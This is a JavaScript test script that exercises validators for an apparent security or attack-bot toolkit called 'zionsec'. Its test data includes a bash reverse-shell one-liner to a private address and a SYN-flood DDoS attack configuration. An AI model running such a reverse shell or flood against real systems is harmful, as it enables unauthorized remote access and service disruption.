#!/usr/bin/env bun

// Valifi Validation Test Script
// Run with: bun run validation-test.js

import { valifi } from './modules/valifi.js';
import awsMockServices from './aws-mock-services.js';

console.log('\n🔍 Running Valifi Validation Tests...\n');

async function runValidationTests() {
    // Reset valifi for clean test run
    valifi.reset();
    
    // Test 1: Network Validation
    console.log('📡 Testing Network Validation...');
    const networkTarget = {
        ip: '192.168.1.100',
        ports: [80, 443, 8080, 22],
        protocol: 'tcp'
    };
    await valifi.validateNetwork(networkTarget);
    
    // Test 2: Payload Validation
    console.log('📦 Testing Payload Validation...');
    const testPayload = {
        type: 'reverse_shell',
        data: 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1',
        timestamp: Date.now(),
        encoding: 'utf8',
        target: 'linux'
    };
    valifi.validatePayload(testPayload);
    
    // Test 3: Attack Validation
    console.log('⚔️ Testing Attack Validation...');
    const attack = {
        type: 'ddos',
        target: '192.168.1.1',
        intensity: 75,
        duration: 60,
        method: 'syn_flood'
    };
    valifi.validateAttack(attack);
    
    // Test 4: AWS Deployment Validation
    console.log('☁️ Testing AWS Deployment Validation...');
    const awsConfig = {
        lambda: {
            functionName: 'zionsec-bot-handler',
            runtime: 'nodejs20.x',
            memory: 512,
            timeout: 30
        },
        s3: {
            bucket: 'zionsec-bot-payloads',
            region: 'us-east-1',
            encryption: true
        },
        dynamodb: {
            table: 'zionsec-bot-logs',
            readCapacity: 5,
            writeCapacity: 5
        },
        sqs: {
            queue: 'zionsec-bot-commands',
            visibilityTimeout: 300,
            messageRetention: 86400
        }
    };
    await valifi.validateAWSDeployment(awsConfig);
    
    // Test 5: Security Validation
    console.log('🔐 Testing Security Validation...');
    const securityConfig = {
        authentication: true,
        authorization: true,
        encryption: true,
        sanitization: true,
        rateLimit: {
            max: 100,
            window: '1m'
        },
        cors: {
            origin: ['http://localhost:3000', 'https://zionsec.app'],
            credentials: true
        }
    };
    valifi.validateSecurity(securityConfig);
    
    // Test 6: Edge Cases
    console.log('🧪 Testing Edge Cases...');
    
    // Invalid IP
    await valifi.validateNetwork({
        ip: '999.999.999.999',
        ports: [80]
    });
    
    // Invalid attack type
    valifi.validateAttack({
        type: 'invalid_attack',
        target: '192.168.1.1'
    });
    
    // Oversized payload
    const largePayload = {
        type: 'test',
        data: 'x'.repeat(2 * 1024 * 1024), // 2MB
        timestamp: Date.now()
    };
    valifi.validatePayload(largePayload);
    
    // Generate final report
    console.log('\n📊 Generating Validation Report...\n');
    const report = valifi.generateReport();
    
    // Test AWS mock services
    console.log('\n🧪 Testing AWS Mock Services...');
    try {
        await awsMockServices.testAWSServices();
    } catch (error) {
        console.error('AWS mock test failed:', error);
    }
    
    // Summary
    console.log('\n' + '='.repeat(50));
    console.log('VALIDATION TEST SUMMARY');
    console.log('='.repeat(50));
    console.log(`✅ Passed: ${report.summary.passed}`);
    console.log(`❌ Failed: ${report.summary.failed}`);
    console.log(`⚠️ Warnings: ${report.summary.warnings}`);
    console.log(`📈 Pass Rate: ${report.summary.passRate}`);
    console.log('\n📋 Recommendations:');
    report.recommendations.forEach(rec => console.log(`  ${rec}`));
    
    // Exit with appropriate code
    process.exit(report.summary.failed > 0 ? 1 : 0);
}

// Run the tests
runValidationTests().catch(error => {
    console.error('❌ Validation test failed:', error);
    process.exit(1);
});